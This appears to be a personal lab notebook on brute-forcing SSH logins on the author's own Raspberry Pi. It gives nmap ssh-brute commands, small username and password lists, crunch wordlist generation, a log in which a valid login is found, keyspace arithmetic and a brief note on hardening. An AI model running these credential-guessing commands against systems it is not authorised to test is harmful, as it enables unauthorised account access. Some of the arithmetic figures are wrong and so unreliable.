# 02 - Brute Force Attack

## Ideas

- write a Python Script to generate passwords
- download a top XX list of the most common passwords
- use a tool to generate passwords

## Questions

- how long does it take to try 100/1000/10.000/1.000.000 passwords?
-

## User NMAP for brute force attack

```
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt --script-args unpwdb.timelimit=0 192.168.0.217
```

## Check if Port 22 is open

```
nmap -p 22 -open <RASPBERRY-PI-IP-ADDRESS>
```

## Create User File

users.txt:

```
user
admin
root
pi
```

## Create Password File

passwords.txt:

```
123456
root
admin
pi
passwort
```

## Generate Password File with Crunch

```
brew install crunch
```

Create file with generated passwords between 3 and 6 characters:

```
crunch 3 6 0123456789abcdef -o 6chars.txt
```

Run brute force attack:

```
nmap -p 22 --script ssh-brute --script-args userdb=6chars.txt,passdb=6chars.txt <RASPBERRY-PI-IP-ADDRESS>
```

Ergebnis:

```
nmap -p 22 --script ssh-brute --script-args userdb=u.txt,passdb=p.txt 192.168.0.217
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-25 16:23 CET
NSE: [ssh-brute] Trying username/password pair: foo:foo
NSE: [ssh-brute] Trying username/password pair: barz:barz
NSE: [ssh-brute] Trying username/password pair: leo:leo
foo
NSE: [ssh-brute] Trying username/password pair: foo:hi
hi
NSE: [ssh-brute] Trying username/password pair: barz:hi
NSE: [ssh-brute] Trying username/password pair: leo:hi
NSE: [ssh-brute] Trying username/password pair: foo:for
NSE: [ssh-brute] Trying username/password pair: barz:for
NSE: [ssh-brute] Trying username/password pair: leo:for
NSE: [ssh-brute] Trying username/password pair: foo:1234
NSE: [ssh-brute] Trying username/password pair: barz:1234
NSE: [ssh-brute] Trying username/password pair: leo:1234
Nmap scan report for raspberrypi (192.168.0.217)
Host is up (0.013s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute:
|   Accounts:
|     leo:1234 - Valid credentials
|_  Statistics: Performed 12 guesses in 9 seconds, average tps: 1.3

Nmap done: 1 IP address (1 host up) scanned in 9.05 seconds
```

NMAP with no time limit:

```
nmap -p 22 --script ssh-brute --script-args userdb=6chars.txt,passdb=6chars.txt,unpwdb.timelimit=0 192.168.0.217
```

http://blog.wenzlaff.de/?p=16896

Anzahl Möglichkeiten:

- a-z: 26^4 = 456972
- a-z & A-Z 52^4 = 7311616
- a-z & A-Z & 0-9 = 13845841

## Combinatorics

Why is the math behind this important?

- characters: 1 / character-set: 0-9 = 10 possible passwords
- characters: 2 / character-set: 0-9 = 10^2 = 100 possible passwords (100 pw attempts / min. = 1 min.)
- characters: 3 / character-set: 0-9 = 10^3 = 1.000 possible passwords (100 pw attempts / min. = 10 min.)
- characters: 4 / character-set: 0-9 = 10^4 = 10.000 possible passwords (100 pw attempts / min. = 100 min. ~ 1,5h)
- characters: 5 / character-set: 0-9 = 10^5 = 100.000 possible passwords (100 pw attempts / min. = 6.000 pw attempts / h = 48.000 / day ~ 2 days)
- characters: 6 / character-set: 0-9 = 10^6 = 1.000.000 possible passwords (100 pw attempts / min. = 6.000 pw attemtps / h = 48.000 / day ~ 20 days)
- ...
- characters: 6 / character-set: a-z A-Z 0-9 = (26+26+10)^6 = 62^6 = 56.800.235.584 possible passwords (100 pw attemps / min. = 6.000 pw attempts / h = 48k / day = 17.520.000 / year ~ 3242 years)

Function to calculate the possible password combinations:

```
<CHARACTER-SET> ^ <NUMBER-OF-CHARACTERS>
```

Further reading: https://www.scientificamerican.com/article/the-mathematics-of-hacking-passwords/

# Lessons Learned

- Brute force attacks do not scale if the password and the used alphabet have a sufficient size
- Trying all username/password combinations will make the problem harder to solve -> this is why not exposing the information if a username is known is a good thing
- Don't try stupid things before doing the math

# Harden Raspberry Pi

## Firewall

### Install

https://www.blog.berrybase.de/blog/2022/02/23/den-raspberry-pi-absichern/#:~:text=Linux%20hat%20hierf%C3%BCr%20die%20Firewall,Befehl%20aus%20Code%2016%20installieren
